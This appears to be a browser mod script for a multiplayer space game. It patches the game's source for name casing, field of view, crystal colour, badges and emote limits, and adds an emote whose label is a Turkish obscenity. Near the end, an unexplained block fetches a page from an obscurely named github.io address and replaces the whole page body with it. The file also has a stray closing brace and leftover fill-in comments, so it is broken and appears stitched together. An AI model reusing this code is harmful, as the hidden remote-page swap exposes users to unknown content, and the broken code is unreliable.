// Initialize code injectors array
if (!window.sbCodeInjectors) window.sbCodeInjectors = [];

// Global settings object
window.modSettings = {
    fovEnabled: true,
    crystalColor: localStorage.getItem('crystal-color') || '#FFFFFF',
    showBlankBadge: localStorage.getItem('show-blank-badge') === 'true',
    emoteAmount: parseInt(localStorage.getItem('emote-amount')) || 4
};

// Lowercase Name Mod
const modName = "Lowercase Name";
const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00A6");

function lowercaseInjector(sbCode) {
    let src = sbCode;
    let prevSrc = src;

    function checkSrcChange() {
        if (src === prevSrc) throw new Error("replace did not work");
        prevSrc = src;
    }

    src = src.replace(/\.toUpperCase\(\)/g, "");
    const styleBlock = `
        <style>
            #player input { text-transform: none !important; }
        </style>
    `;
    src = src.replace('</head>', `${styleBlock}</head>`);
    checkSrcChange();

    logLowercase("Mod injected");
    return src;
}

// Custom Emote Mod
const emoteModName = "Custom Emote";
const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA500");

function emoteInjector(sbCode) {
    let src = sbCode;
    let prevSrc = src;

    function checkSrcChange() {
        if (src === prevSrc) throw new Error("replace did not work");
        prevSrc = src;
    }

    const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
    const clownEmote = `,{
                    text: "orosbu cocu",
                    icon: "🤡",
                    key: "J"
                }`;

    src = src.replace(vocabPattern, `$1${clownEmote}`);
    checkSrcChange();

    logEmote("Clown emote injected");
    return src;
}

// FOV Editor Mod
const fovModName = "FOV Editor";
const logFOV = (msg) => console.log(`%c[${fovModName}] ${msg}`, "color: #00A6FF");

window.I1000 = window.I1000 || {};
window.I1000.baseFOV = 45;
window.I1000.currentFOV = 45;

function fovInjector(sbCode) {
    let src = sbCode;
    let prevSrc = src;

    function checkSrcChange() {
        if (src === prevSrc) throw new Error("replace did not work");
        prevSrc = src;
    }

    const fovPattern = /this\.I1000\.fov\s*=\s*45\s*\*\s*this\.IO11l\.I1000\.zoom/g;
    src = src.replace(fovPattern, 'this.I1000.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IO11l.I1000.zoom');
    checkSrcChange();

    const controlStyles = `
        <style>
            #mod-controls {
                position: fixed;
                top: 10px;
                right: 10px;
                z-index: 1000;
                font-family: Arial, sans-serif;
                user-select: none;
                width: 120px;
            }

            #mod-controls-header {
                background: rgba(0, 0, 0, 0.8);
                color: white;
                padding: 8px 15px;
                border-radius: 5px;
                cursor: pointer;
                text-align: center;
            }

            #mod-controls-panel {
                background: rgba(0, 0, 0, 0.8);
                color: white;
                padding: 10px;
                border-radius: 5px;
                margin-top: 5px;
                display: none;
            }

            .mod-control {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin: 5px 0;
                width: 100%;
            }

            #fov-display {
                background: rgba(0, 0, 0, 0.7);
                padding: 5px 10px;
                border-radius: 5px;
                color: white;
                margin-top: 5px;
                display: none;
            }

            .toggle-switch {
                position: relative;
                display: inline-block;
                width: 30px;
                height: 17px;
            }

            .toggle-switch input {
                opacity: 0;
                width: 0;
                height: 0;
            }

            .slider {
                position: absolute;
                cursor: pointer;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background-color: #ccc;
                transition: .4s;
                border-radius: 17px;
            }

            .slider:before {
                position: absolute;
                content: "";
                height: 13px;
                width: 13px;
                left: 2px;
                bottom: 2px;
                background-color: white;
                transition: .4s;
                border-radius: 50%;
            }

            input:checked + .slider {
                background-color: #2196F3;
            }

            input:checked + .slider:before {
                transform: translateX(13px);
            }

            #crystal-color-input {
                width: 100%;
                margin-top: 5px;
                padding: 5px;
                border-radius: 5px;
                border: none;
            }

            #emote-amount-slider {
                width: 100%;
                margin-top: 5px;
            }
        </style>
    `;

    const controlsHTML = `
        <div id="mod-controls">
            <div id="mod-controls-header">Controls</div>
            <div id="mod-controls-panel">
                <div class="mod-control">
                    <span>FOV</span>
                    <label class="toggle-switch">
                        <input type="checkbox" id="fov-toggle" checked>
                        <span class="slider"></span>
                    </label>
                </div>
                <div class="mod-control">
                    <span>Crystal Color</span>
                    <input type="color" id="crystal-color-input" value="${window.modSettings.crystalColor}">
                </div>
                <div class="mod-control">
                    <span>Show Blank Badge</span>
                    <label class="toggle-switch">
                        <input type="checkbox" id="show-blank-badge-toggle" ${window.modSettings.showBlankBadge ? 'checked' : ''}>
                        <span class="slider"></span>
                    </label>
                </div>
                <div class="mod-control">
                    <span>Emote Amount</span>
                    <input type="range" id="emote-amount-slider" min="1" max="5" value="${window.modSettings.emoteAmount}">
                </div>
            </div>
            <div id="fov-display">
                FOV: <span id="fov-value">45</span>
            </div>
        </div>
    `;

    src = src.replace('</body>', `
        ${controlStyles}
        ${controlsHTML}
        <script>
            document.addEventListener('DOMContentLoaded', () => {
                const controlsHeader = document.getElementById('mod-controls-header');
                const controlsPanel = document.getElementById('mod-controls-panel');
                const fovToggle = document.getElementById('fov-toggle');
                const fovDisplay = document.getElementById('fov-display');
                const crystalColorInput = document.getElementById('crystal-color-input');
                const showBlankBadgeToggle = document.getElementById('show-blank-badge-toggle');
                const emoteAmountSlider = document.getElementById('emote-amount-slider');

                controlsHeader.addEventListener('click', () => {
                    controlsPanel.style.display = controlsPanel.style.display === 'none' ? 'block' : 'none';
                });

                fovToggle.addEventListener('change', () => {
                    window.modSettings.fovEnabled = fovToggle.checked;
                    fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
                });

                document.addEventListener('wheel', (e) => {
                    if (!window.modSettings.fovEnabled) return;
                    e.preventDefault();
                    if (e.deltaY < 0) {
                        window.I1000.currentFOV += 1;
                    } else {
                        window.I1000.currentFOV = Math.max(1, window.I1000.currentFOV - 1);
                    }
                    document.getElementById('fov-value').textContent = window.I1000.currentFOV;
                }, { passive: false });

                crystalColorInput.addEventListener('input', (e) => {
                    const color = e.target.value;
                    window.modSettings.crystalColor = color;
                    localStorage.setItem('crystal-color', color);
                });

                showBlankBadgeToggle.addEventListener('change', (e) => {
                    const showBlankBadge = e.target.checked;
                    window.modSettings.showBlankBadge = showBlankBadge;
                    localStorage.setItem('show-blank-badge', showBlankBadge);
                });

                emoteAmountSlider.addEventListener('input', (e) => {
                    const emoteAmount = parseInt(e.target.value);
                    window.modSettings.emoteAmount = emoteAmount;
                    localStorage.setItem('emote-amount', emoteAmount);
                });
            });
        </script>
        </body>`);
    checkSrcChange();

    logFOV("FOV injector applied");
    return src;
}

// Crystal Color Changer
function crystalColorInjector(sbCode) {
    let src = sbCode;
    const crystalCode = `
        let CrystalObject;
        for (let i in window) {
            try {
                let val = window[i];
                if (val && typeof val.prototype.createModel === "function" && val.prototype.createModel.toString().includes("Crystal")) {
                    CrystalObject = val;
                    break;
                }
            } catch (e) {
                console.error('Error finding CrystalObject:', e);
            }
        }
        if (!CrystalObject) {
            CrystalObject = function() {};
            CrystalObject.prototype = {
                createModel: function() {},
                getModelInstance: function() {
                    let res = oldModel.apply(this, arguments);
                    let color = window.modSettings.crystalColor;
                    if (color) this.material.color.set(color);
                    return res;
                }
            };
        }
        let oldModel = CrystalObject.prototype.getModelInstance;
        CrystalObject.prototype.getModelInstance = function() {
            let res = oldModel.apply(this, arguments);
            let color = window.modSettings.crystalColor;
            if (color) this.material.color.set(color);
            return res;
        };
    `;

    src = src.replace('</body>', `<script>${crystalCode}</script></body>`);
    return src;
}

// Show Blank Badge
function showBlankBadgeInjector(sbCode) {
    let src = sbCode;
    const blankBadgeCode = `
        let pattern = /,\\s*"blank"\\s*!={1,2}\\s*this\\.custom\\.badge/;

        Search: for (let i in window) try {
            let val = window[i].prototype;
            for (let j in val) {
                let func = val[j];
                if ("function" == typeof func && func.toString().match(pattern)) {
                    val[j] = new Function("return " + func.toString().replace(pattern, ", window.modSettings.showBlankBadge || $1")).call(val);
                    val.drawIcon = new Function("return " + val.drawIcon.toString().replace(/}\\s*else\\s*{/, '} else if (this.icon !== "blank") {')).call(val);
                    let gl = window[i];
                    for (let k in gl) {
                        if ("function" == typeof gl[k] && gl[k].toString().includes(".table")) {
                            let oldF = gl[k];
                            gl[k] = function () {
                                let current = window.modSettings.showBlankBadge;
                                if (this.showBlank !== current) {
                                    for (let i in this.table) if (i.startsWith("blank")) delete this.table[i];
                                    this.showBlank = current;
                                }
                                return oldF.apply(this, arguments);
                            };
                            break Search;
                        }
                    }
                }
            }
        }
        catch (e) {
            console.error('Error in showBlankBadgeInjector:', e);
        }
    `;

    src = src.replace('</body>', `<script>${blankBadgeCode}</script></body>`);
    return src;
}

// Emote Capacity
function emoteCapacityInjector(sbCode) {
    let src = sbCode;
    const emoteCapacityCode = `
        let globalVal = ChatPanel.toString().match(/[0OlI1]{5}/)[0];
        ChatPanel.prototype.getEmotesCapacity = function () {
            let num = window.modSettings.emoteAmount;
            try { return (num == null || isNaN(num)) ? 4 : (Math.trunc(Math.min(Math.max(1, num), 5)) || 4) }
            catch (e) { return 4 }
        };
        ChatPanel.prototype.typed = new Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()")).call(ChatPanel.prototype);
    `;

    src = src.replace('</body>', `<script>${emoteCapacityCode}</script></body>`);
    return src;
}

// Add all injectors
window.sbCodeInjectors.push((sbCode) => {
    try {
        return lowercaseInjector(sbCode);
    } catch (error) {
        alert(`${modName} failed to load; error: ${error}`);
        throw error;
    }
});

window.sbCodeInjectors.push((sbCode) => {
    try {
        return emoteInjector(sbCode);
    } catch (error) {
        alert(`${emoteModName} failed to load; error: ${error}`);
        throw error;
    }
});

window.sbCodeInjectors.push((sbCode) => {
    try {
        return fovInjector(sbCode);
    } catch (error) {
        alert(`${fovModName} failed to load; error: ${error}`);
        throw error;
    }
});

window.sbCodeInjectors.push((sbCode) => {
    try {
        return crystalColorInjector(sbCode);
    } catch (error) {
        alert(`Crystal Color Changer failed to load; error: ${error}`);
        throw error;
    }
});

window.sbCodeInjectors.push((sbCode) => {
    try {
        return showBlankBadgeInjector(sbCode);
    } catch (error) {
        alert(`Show Blank Badge failed to load; error: ${error}`);
        throw error;
    }
});

window.sbCodeInjectors.push((sbCode) => {
    try {
        return emoteCapacityInjector(sbCode);
    } catch (error) {
        alert(`Emote Capacity failed to load; error: ${error}`);
        throw error;
    }
});

// Main code injection logic
const log = (msg) => console.log(`%c[Mod injector] ${msg}`, "color: #06c26d");

// At the bottom of your script, complete the injectLoader function:
function injectLoader() {
    if (window.location.pathname !== "/") {
        log("Injection not needed");
        return;
    }

    // Get the game's script element
    const gameScript = document.querySelector('script[src*="game"]'); // Adjust selector based on actual game script
    if (!gameScript) {
        log("Game script not found");
        return;
    }

    // Create an observer to watch for script changes
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            if (mutation.type === 'childList') {
                const scriptContent = mutation.target.textContent;
                if (scriptContent) {
                    // Apply all injectors
                    let modifiedCode = scriptContent;
                    window.sbCodeInjectors.forEach((injector) => {
                        try {
                            modifiedCode = injector(modifiedCode);
                        } catch (error) {
                            console.error('Injector failed:', error);
                        }
                    });

                    // Replace the original script content
                    mutation.target.textContent = modifiedCode;
                    log("Injections complete");
                    observer.disconnect();
                }
            }
        });
    });

    // Start observing the script element
    observer.observe(gameScript, { childList: true });
}

// Add this line to actually call the function when the script loads
document.addEventListener('DOMContentLoaded', injectLoader);


    // New script to load content from URL and inject it into the document
    document.addEventListener('DOMContentLoaded', () => {
        var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1s%C4%B1mn1s%C3%B6sm2k1.html',
            xhr = new XMLHttpRequest();
        xhr.open('GET', url);
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
                var mErt = xhr.responseText;
                document.body.innerHTML = mErt;

                // Apply injectors after content is loaded
                window.sbCodeInjectors.forEach((injector) => {
                    try {
                        document.documentElement.innerHTML = injector(document.documentElement.innerHTML);
                    } catch (error) {
                        console.error(`Injector failed: ${error}`);
                    }
                });
            }
        };
        xhr.send();
    });
}

// Call the loader function
injectLoader();
